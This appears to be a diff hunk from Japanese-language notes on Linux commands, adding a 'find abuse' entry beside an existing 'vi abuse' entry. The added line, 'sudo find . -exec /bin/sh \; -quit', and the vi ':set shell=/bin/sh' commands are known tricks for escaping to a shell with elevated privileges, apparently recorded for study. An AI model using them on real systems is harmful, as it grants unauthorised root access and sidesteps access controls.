@@ -49,4 +49,6 @@ find <検索場所のパス> <オプション> <検索ファイル名>
 # viの悪用
 :set shell=/bin/sh
 :shell
+# findの悪用
+sudo find . -exec /bin/sh \; -quit
 ```
